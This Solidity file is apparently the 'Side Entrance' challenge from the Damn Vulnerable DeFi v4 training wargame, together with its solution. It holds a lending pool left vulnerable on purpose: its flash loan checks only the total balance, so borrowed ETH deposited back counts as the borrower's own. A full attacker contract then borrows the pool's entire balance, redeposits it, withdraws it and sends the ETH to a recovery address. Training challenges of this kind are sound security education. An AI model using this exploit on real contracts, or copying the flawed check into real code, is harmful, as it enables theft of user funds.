// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
}

// Attacker contract to drain the pool
contract SideEntranceAttacker {
    SideEntranceLenderPool private immutable pool;
    address private immutable owner;
    address private immutable recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        owner = msg.sender;
        recovery = _recovery;
    }

    function attack() external {
        // Flashloan the entire pool balance
        pool.flashLoan(address(pool).balance);
        // Now we have balance credited in the pool, withdraw it
        pool.withdraw();
        // Transfer the drained ETH to recovery address
        payable(recovery).transfer(address(this).balance);
    }

    // Called by the pool during flashLoan
    function execute() external payable {
        // Deposit the flash loaned amount back into the pool
        // This gives us credit for the amount while satisfying the balance check
        pool.deposit{value: msg.value}();
    }

    // Required to receive ETH from the pool
    receive() external payable {}
}
